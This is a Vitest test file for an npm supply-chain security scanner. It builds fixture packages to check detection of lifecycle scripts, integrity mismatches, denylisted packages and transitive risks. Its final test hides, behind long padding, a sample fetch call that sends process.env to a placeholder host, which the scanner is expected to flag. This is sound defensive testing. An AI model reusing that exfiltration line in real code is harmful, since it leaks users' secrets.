import { createHash } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import { mkdir, mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import * as tar from 'tar';
import { afterEach, describe, expect, test } from 'vitest';
import { evaluatePackages, scanProject } from '../../src/core/engine.js';
import type {
  PackageCandidate,
  PackageMetadata,
  RegistryClient,
  SourceVerifier
} from '../../src/core/types.js';
import { inspectTarballBuffer } from '../../src/registry/tarball.js';

async function writePackage(
  root: string,
  name: string,
  manifest: Record<string, unknown>,
  files: Record<string, string | Buffer> = {}
): Promise<string> {
  const dir = join(root, name);
  await mkdir(dir, { recursive: true });
  await writeFile(join(dir, 'package.json'), JSON.stringify(manifest), 'utf8');
  for (const [path, content] of Object.entries(files)) {
    const target = join(dir, path);
    await mkdir(dirname(target), { recursive: true });
    await writeFile(target, content);
  }
  return dir;
}

async function packDirectory(
  root: string,
  sourceDir: string,
  tarballName: string
): Promise<Buffer> {
  const tarball = join(root, tarballName);
  await tar.c(
    {
      cwd: sourceDir,
      gzip: true,
      file: tarball,
      portable: true,
      prefix: 'package/'
    },
    ['.']
  );
  return readFile(tarball);
}

function sri(buffer: Buffer): string {
  return `sha512-${createHash('sha512').update(buffer).digest('base64')}`;
}

function localCandidate(
  spec: string,
  sourceType: PackageCandidate['sourceType']
): PackageCandidate {
  return {
    name: spec,
    requested: spec,
    spec,
    source: 'cli',
    sourceType
  };
}

function remoteCandidate(spec: string): PackageCandidate {
  return localCandidate(spec, 'remote-tarball');
}

function registryWithTarballs(input: {
  packages: Record<string, PackageMetadata>;
  tarballs?: Record<string, Buffer>;
}): RegistryClient & { fetchCount(url?: string): number } {
  const fetches = new Map<string, number>();
  return {
    async getPackageMetadata(name: string) {
      const metadata = input.packages[name];
      if (!metadata) throw new Error(`missing metadata for ${name}`);
      return metadata;
    },
    async resolveVersion(name: string, range = '*') {
      const metadata = input.packages[name];
      if (!metadata) throw new Error(`missing metadata for ${name}`);
      if (metadata.versions[range]) return range;
      const latest = metadata['dist-tags']?.latest;
      if (!latest) throw new Error(`missing latest for ${name}`);
      return latest;
    },
    async fetchTarball(tarballUrl: string) {
      fetches.set(tarballUrl, (fetches.get(tarballUrl) ?? 0) + 1);
      const buffer = input.tarballs?.[tarballUrl];
      if (!buffer) throw new Error(`missing tarball for ${tarballUrl}`);
      return buffer;
    },
    isSupportedTarballUrl() {
      return true;
    },
    fetchCount(url?: string) {
      if (url) return fetches.get(url) ?? 0;
      return [...fetches.values()].reduce((sum, count) => sum + count, 0);
    }
  };
}

async function writeRootManifest(cwd: string, dependencies: Record<string, string>) {
  await writeFile(join(cwd, 'package.json'), JSON.stringify({ private: true, dependencies }));
}

async function writeProductionPolicy(cwd: string) {
  await writeFile(join(cwd, 'npm-gate.config.json'), JSON.stringify({ profile: 'production' }));
}

async function startTarballRouter(
  routes: Record<string, { body?: Buffer | string; statusCode?: number }>
): Promise<{ server: Server; baseUrl: string }> {
  const server = createServer((request, response) => {
    const route = routes[request.url ?? ''];
    response.statusCode = route?.statusCode ?? 404;
    if (response.statusCode === 200) {
      response.setHeader('content-type', 'application/octet-stream');
    }
    response.end(route?.body ?? 'not found');
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  if (!address || typeof address === 'string') throw new Error('HTTP fixture did not bind');
  return { server, baseUrl: `http://127.0.0.1:${address.port}/` };
}

const servers: Server[] = [];

afterEach(async () => {
  await Promise.all(
    servers.splice(0).map(
      (server) => new Promise<void>((resolve) => server.close(() => resolve()))
    )
  );
});

describe('engine scanner scenarios', () => {
  test('scans direct manifest dependencies and ignores lockfile-only transitive packages', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-unit-scan-'));
    await writeRootManifest(cwd, { direct: '1.0.0' });
    await writeFile(
      join(cwd, 'pnpm-lock.yaml'),
      [
        "lockfileVersion: '9.0'",
        'packages:',
        '  direct@1.0.0:',
        '    resolution: {integrity: sha512-fixture}',
        '  transitive-only@1.0.0:',
        '    resolution: {integrity: sha512-fixture}'
      ].join('\n')
    );
    const metadataCalls: string[] = [];
    const registry: RegistryClient = {
      async getPackageMetadata(name: string) {
        metadataCalls.push(name);
        if (name === 'transitive-only') throw new Error('unexpected transitive lookup');
        return {
          name,
          versions: {
            '1.0.0': {
              name,
              version: '1.0.0',
              repository: { type: 'git', url: 'https://example.test/direct.git' }
            }
          },
          time: { '1.0.0': '2026-01-02T00:00:00.000Z' },
          'dist-tags': { latest: '1.0.0' }
        };
      },
      async resolveVersion(_name: string, range: string | undefined) {
        return range ?? '1.0.0';
      }
    };

    const report = await scanProject({
      cwd,
      registry,
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings.map((finding) => finding.package)).toEqual(['direct']);
    expect(metadataCalls).toEqual(['direct']);
  });

  test('evaluates local directories and local tarballs without registry lookups', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-unit-local-'));
    const cleanDir = await writePackage(cwd, 'dir-src', {
      name: 'clean-directory',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/repo.git' }
    });
    const scriptDir = await writePackage(cwd, 'script-dir-src', {
      name: 'script-directory',
      version: '1.0.0',
      scripts: { preinstall: 'node preinstall.js' },
      repository: { type: 'git', url: 'https://example.test/repo.git' }
    });
    const tarSource = await writePackage(
      cwd,
      'tar-src',
      {
        name: 'suspicious-local',
        version: '1.0.0',
        repository: { type: 'git', url: 'https://example.test/repo.git' }
      },
      { 'scripts/install.sh': '#!/bin/sh\n' }
    );
    const tarballPath = join(cwd, 'suspicious-local-1.0.0.tgz');
    await writeFile(tarballPath, await packDirectory(cwd, tarSource, 'packed.tgz'));
    const missingTarballSource = join(cwd, 'missing-tar-src');
    await mkdir(missingTarballSource, { recursive: true });
    await writeFile(join(missingTarballSource, 'index.js'), 'console.log("fixture");', 'utf8');
    const missingManifestTarball = join(cwd, 'missing-manifest.tgz');
    await writeFile(
      missingManifestTarball,
      await packDirectory(cwd, missingTarballSource, 'missing-packed.tgz')
    );

    const report = await evaluatePackages({
      cwd,
      env: { NPM_GATE_MODE: 'warn' },
      candidates: [
        localCandidate(cleanDir, 'local-directory'),
        localCandidate(scriptDir, 'local-directory'),
        localCandidate(tarballPath, 'local-tarball'),
        localCandidate(missingManifestTarball, 'local-tarball')
      ]
    });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ package: 'clean-directory', decision: 'allow' }),
        expect.objectContaining({
          package: 'script-directory',
          decision: 'block',
          reasons: ['Lifecycle script detected: preinstall']
        }),
        expect.objectContaining({
          package: 'suspicious-local',
          decision: 'warn',
          reasons: ['Shell or PowerShell script found: package/scripts/install.sh']
        }),
        expect.objectContaining({
          package: missingManifestTarball,
          decision: 'block',
          reasons: ['Local package source is missing package.json']
        })
      ])
    );
  });

  test('inspects configured-registry remote tarballs through the default registry client', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-unit-remote-'));
    const cleanSource = await writePackage(cwd, 'remote-clean-src', {
      name: 'remote-clean',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/repo.git' }
    });
    const invalidSource = join(cwd, 'remote-invalid-src');
    await mkdir(invalidSource, { recursive: true });
    await writeFile(join(invalidSource, 'package.json'), '{ invalid json', 'utf8');
    const served = await startTarballRouter({
      '/clean/-/pkg-1.0.0.tgz': {
        statusCode: 200,
        body: await packDirectory(cwd, cleanSource, 'remote-clean.tgz')
      },
      '/invalid/-/pkg-1.0.0.tgz': {
        statusCode: 200,
        body: await packDirectory(cwd, invalidSource, 'remote-invalid.tgz')
      },
      '/missing/-/pkg-1.0.0.tgz': { statusCode: 404 }
    });
    servers.push(served.server);
    const cleanUrl = `${served.baseUrl}clean/-/pkg-1.0.0.tgz`;
    const invalidUrl = `${served.baseUrl}invalid/-/pkg-1.0.0.tgz`;
    const missingUrl = `${served.baseUrl}missing/-/pkg-1.0.0.tgz`;

    const report = await evaluatePackages({
      cwd,
      env: { NPM_GATE_MODE: 'warn', npm_config_registry: served.baseUrl },
      candidates: [
        remoteCandidate(cleanUrl),
        remoteCandidate(invalidUrl),
        remoteCandidate(missingUrl),
        remoteCandidate('https://downloads.example.test/pkg/-/pkg-1.0.0.tgz')
      ]
    });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ package: 'remote-clean', decision: 'allow' }),
        expect.objectContaining({
          package: invalidUrl,
          decision: 'block',
          reasons: ['Remote tarball package.json is invalid']
        }),
        expect.objectContaining({
          package: missingUrl,
          decision: 'block',
          reasons: ['Unable to inspect remote package tarball']
        }),
        expect.objectContaining({
          package: 'https://downloads.example.test/pkg/-/pkg-1.0.0.tgz',
          decision: 'block',
          reasons: ['Direct remote tarball host is not configured for inspection']
        })
      ])
    );
  });

  test('inspects registry tarballs, validates integrity, and caches duplicate candidates', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-unit-registry-tar-'));
    await writeProductionPolicy(cwd);
    const previousSource = await writePackage(cwd, 'registry-prev-src', {
      name: 'registry-cache',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/registry-cache.git' }
    });
    const currentSource = await writePackage(
      cwd,
      'registry-current-src',
      {
        name: 'registry-cache',
        version: '1.0.1',
        repository: { type: 'git', url: 'https://example.test/registry-cache.git' }
      },
      { 'native.node': Buffer.from([0, 1, 2, 3]) }
    );
    const previousBuffer = await packDirectory(cwd, previousSource, 'registry-cache-1.0.0.tgz');
    const currentBuffer = await packDirectory(cwd, currentSource, 'registry-cache-1.0.1.tgz');
    const previousTarball = 'https://registry.example/registry-cache/-/registry-cache-1.0.0.tgz';
    const currentTarball = 'https://registry.example/registry-cache/-/registry-cache-1.0.1.tgz';
    const registry = registryWithTarballs({
      packages: {
        'registry-cache': {
          name: 'registry-cache',
          versions: {
            '1.0.0': {
              name: 'registry-cache',
              version: '1.0.0',
              repository: { type: 'git', url: 'https://example.test/registry-cache.git' },
              dist: { tarball: previousTarball, integrity: sri(previousBuffer) }
            },
            '1.0.1': {
              name: 'registry-cache',
              version: '1.0.1',
              repository: { type: 'git', url: 'https://example.test/registry-cache.git' },
              dist: { tarball: currentTarball, integrity: sri(currentBuffer) }
            }
          },
          time: {
            '1.0.0': '2026-01-01T00:00:00.000Z',
            '1.0.1': '2026-01-02T00:00:00.000Z'
          },
          'dist-tags': { latest: '1.0.1' }
        }
      },
      tarballs: { [previousTarball]: previousBuffer, [currentTarball]: currentBuffer }
    });

    const report = await evaluatePackages({
      cwd,
      registry,
      candidates: [
        { name: 'registry-cache', spec: '1.0.1' },
        { name: 'registry-cache', spec: '1.0.1' }
      ],
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings[0]).toMatchObject({
      package: 'registry-cache',
      riskCategory: 'artifact_diff_risk'
    });
    expect(report.findings[0]?.matchedSignals).toContain('new-binary-file');
    expect(registry.fetchCount(previousTarball)).toBe(1);
    expect(registry.fetchCount(currentTarball)).toBe(1);
  });

  test('blocks registry tarballs with lifecycle scripts and integrity mismatches', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-unit-registry-block-'));
    await writeProductionPolicy(cwd);
    const scriptSource = await writePackage(cwd, 'script-src', {
      name: 'registry-script',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/registry-script.git' },
      scripts: { postinstall: 'node postinstall.js' }
    });
    const cleanSource = await writePackage(cwd, 'integrity-src', {
      name: 'registry-integrity',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/registry-integrity.git' }
    });
    const scriptBuffer = await packDirectory(cwd, scriptSource, 'registry-script.tgz');
    const cleanBuffer = await packDirectory(cwd, cleanSource, 'registry-integrity.tgz');
    const scriptTarball = 'https://registry.example/registry-script/-/registry-script-1.0.0.tgz';
    const integrityTarball =
      'https://registry.example/registry-integrity/-/registry-integrity-1.0.0.tgz';

    const report = await evaluatePackages({
      cwd,
      registry: registryWithTarballs({
        packages: {
          'registry-script': {
            name: 'registry-script',
            versions: {
              '1.0.0': {
                name: 'registry-script',
                version: '1.0.0',
                repository: { type: 'git', url: 'https://example.test/registry-script.git' },
                scripts: { postinstall: 'node postinstall.js' },
                dist: { tarball: scriptTarball, integrity: sri(scriptBuffer) }
              }
            },
            time: { '1.0.0': '2026-01-01T00:00:00.000Z' },
            'dist-tags': { latest: '1.0.0' }
          },
          'registry-integrity': {
            name: 'registry-integrity',
            versions: {
              '1.0.0': {
                name: 'registry-integrity',
                version: '1.0.0',
                repository: { type: 'git', url: 'https://example.test/registry-integrity.git' },
                dist: { tarball: integrityTarball, integrity: 'sha512-bad' }
              }
            },
            time: { '1.0.0': '2026-01-01T00:00:00.000Z' },
            'dist-tags': { latest: '1.0.0' }
          }
        },
        tarballs: { [scriptTarball]: scriptBuffer, [integrityTarball]: cleanBuffer }
      }),
      candidates: [
        { name: 'registry-script', spec: '1.0.0' },
        { name: 'registry-integrity', spec: '1.0.0' }
      ],
      env: { NPM_GATE_MODE: 'warn' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          package: 'registry-script',
          decision: 'block',
          reasons: expect.arrayContaining(['Lifecycle script detected: postinstall'])
        }),
        expect.objectContaining({
          package: 'registry-integrity',
          decision: 'block',
          reasons: expect.arrayContaining([
            'Registry tarball integrity does not match metadata'
          ])
        })
      ])
    );
  });

  test('inspects transitive dependency closure and preserves dependency paths', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-unit-transitive-'));
    await writeProductionPolicy(cwd);
    const rootSource = await writePackage(cwd, 'root-src', {
      name: 'root-package',
      version: '1.0.0',
      repository: { type: 'git', url: 'https://example.test/root-package.git' },
      dependencies: { 'hidden-child': '2.0.0' }
    });
    const childSource = await writePackage(cwd, 'child-src', {
      name: 'hidden-child',
      version: '2.0.0',
      repository: { type: 'git', url: 'https://example.test/hidden-child.git' },
      scripts: { postinstall: 'node install.js' }
    });
    const rootBuffer = await packDirectory(cwd, rootSource, 'root-package.tgz');
    const childBuffer = await packDirectory(cwd, childSource, 'hidden-child.tgz');
    const rootTarball = 'https://registry.example/root-package/-/root-package-1.0.0.tgz';
    const childTarball = 'https://registry.example/hidden-child/-/hidden-child-2.0.0.tgz';

    const report = await evaluatePackages({
      cwd,
      registry: registryWithTarballs({
        packages: {
          'root-package': {
            name: 'root-package',
            versions: {
              '1.0.0': {
                name: 'root-package',
                version: '1.0.0',
                repository: { type: 'git', url: 'https://example.test/root-package.git' },
                dependencies: { 'hidden-child': '2.0.0' },
                dist: { tarball: rootTarball, integrity: sri(rootBuffer) }
              }
            },
            time: { '1.0.0': '2026-01-01T00:00:00.000Z' },
            'dist-tags': { latest: '1.0.0' }
          },
          'hidden-child': {
            name: 'hidden-child',
            versions: {
              '2.0.0': {
                name: 'hidden-child',
                version: '2.0.0',
                repository: { type: 'git', url: 'https://example.test/hidden-child.git' },
                scripts: { postinstall: 'node install.js' },
                dist: { tarball: childTarball, integrity: sri(childBuffer) }
              }
            },
            time: { '2.0.0': '2026-01-01T00:00:00.000Z' },
            'dist-tags': { latest: '2.0.0' }
          }
        },
        tarballs: { [rootTarball]: rootBuffer, [childTarball]: childBuffer }
      }),
      candidates: [{ name: 'root-package', spec: '1.0.0' }],
      env: { NPM_GATE_MODE: 'ci' },
      now: new Date('2026-05-14T00:00:00.000Z')
    });

    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          package: 'hidden-child',
          decision: 'block',
          dependencyPath: ['root-package@1.0.0', 'hidden-child@2.0.0'],
          reasons: expect.arrayContaining(['Lifecycle script detected: postinstall'])
        })
      ])
    );
  });

  test('applies injected advisories, emergency denylist, source verification, and signature policy', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-unit-policy-paths-'));
    await writeRootManifest(cwd, {
      malicious: '1.0.0',
      'known-bad': '1.0.0',
      verified: '1.0.0',
      signed: '1.0.0'
    });
    await writeFile(
      join(cwd, 'npm-gate.config.json'),
      JSON.stringify({
        policyMode: 'emergency',
        requireCryptographicSignatureVerification: true,
        emergencyDenylist: [
          { package: 'known-bad', versions: ['1.0.0'], reason: 'active incident' }
        ],
        sourceVerification: {
          enabled: true,
          rules: [
            {
              package: 'verified',
              repository: 'owner/verified',
              tagTemplate: 'v{version}',
              commit: 'expected',
              required: true
            }
          ]
        }
      })
    );
    const calls: Array<{ repository: string; tag?: string; commit?: string }> = [];
    const sourceVerifier: SourceVerifier = {
      async resolveTagCommit(repository, tag) {
        calls.push({ repository, tag });
        return 'actual';
      },
      async hasCommit(repository, commit) {
        calls.push({ repository, commit });
        return commit === 'expected';
      }
    };
    const registry: RegistryClient = {
      async getPackageMetadata(name: string) {
        return {
          name,
          versions: {
            '1.0.0': {
              name,
              version: '1.0.0',
              repository: { type: 'git', url: `https://github.com/owner/${name}.git` },
              dist: name === 'signed' ? { signatures: [{ keyid: 'fixture' }] } : undefined
            }
          },
          time: { '1.0.0': '2026-01-01T00:00:00.000Z' },
          'dist-tags': { latest: '1.0.0' }
        };
      },
      async resolveVersion() {
        return '1.0.0';
      }
    };

    const report = await scanProject({
      cwd,
      registry,
      sourceVerifier,
      signatureVerifier: {
        async verify({ packageName }) {
          return packageName === 'signed'
            ? { status: 'unavailable', message: 'offline fixture' }
            : { status: 'missing', message: 'no signatures' };
        }
      },
      env: { NPM_GATE_MODE: 'warn', NPM_GATE_POLICY_MODE: 'emergency' },
      now: new Date('2026-05-14T00:00:00.000Z'),
      advisories: [
        {
          name: 'malicious',
          versions: ['1.0.0'],
          type: 'malicious',
          severity: 'critical',
          summary: 'Injected malicious advisory'
        }
      ]
    });

    expect(calls).toEqual([
      { repository: 'owner/verified', tag: 'v1.0.0' },
      { repository: 'owner/verified', commit: 'expected' }
    ]);
    expect(report.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          package: 'malicious',
          decision: 'block',
          matchedSignals: expect.arrayContaining(['known-malicious-advisory'])
        }),
        expect.objectContaining({
          package: 'known-bad',
          decision: 'block',
          riskCategory: 'emergency_denylist_risk'
        }),
        expect.objectContaining({
          package: 'verified',
          matchedSignals: expect.arrayContaining(['source-tag-commit-mismatch'])
        }),
        expect.objectContaining({
          package: 'signed',
          reasons: expect.arrayContaining([
            'Cryptographic signature verification unavailable for signed@1.0.0'
          ])
        })
      ])
    );
  });

  test('detects full-text tarball content beyond the sampled prefix', async () => {
    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-unit-full-text-'));
    const source = await writePackage(
      cwd,
      'full-text-src',
      { name: 'full-text-package', version: '1.0.0' },
      {
        'install.js': `${'a'.repeat(20_000)} fetch('https://example.invalid', { body: JSON.stringify(process.env) });`
      }
    );
    const inspection = await inspectTarballBuffer(await packDirectory(cwd, source, 'full-text.tgz'), {
      fullTextScanning: true
    });

    expect(inspection.signals.map((signal) => signal.id)).toContain('process-env-network-exfil');
  });
});
